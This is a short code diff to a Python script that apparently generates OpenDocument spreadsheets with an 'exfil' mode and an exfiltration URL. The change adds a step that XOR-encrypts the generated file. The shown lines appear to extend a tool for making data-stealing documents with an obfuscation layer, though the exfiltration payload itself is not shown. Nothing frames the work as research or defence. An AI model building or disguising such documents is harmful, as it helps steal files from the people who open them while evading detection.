@@ -46,6 +46,10 @@ from datetime import datetime, timezone
 from pathlib import Path
 from urllib.parse import quote
 
+sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
+
+from utils.xor import encrypt_file, load_xor_key
+
 PROJECT_DIR = Path(__file__).resolve().parent.parent
 OUTPUT_DIR = PROJECT_DIR / "output"
 ODS_MIMETYPE = "application/vnd.oasis.opendocument.spreadsheet"
@@ -319,11 +323,13 @@ def main(argv: list[str] | None = None) -> int:
             mode=args.mode,
             exfil_url=exfil_url,
         )
+        xored_path = encrypt_file(output_path, load_xor_key(PROJECT_DIR))
     except (OSError, ValueError) as exc:
         print(f"Generation failed: {exc}", file=sys.stderr)
         return 1
 
     print(f"Generated: {output_path}")
+    print(f"XORed file: {xored_path}")
     for path in files:
         if args.mode == "exfil":
             print(
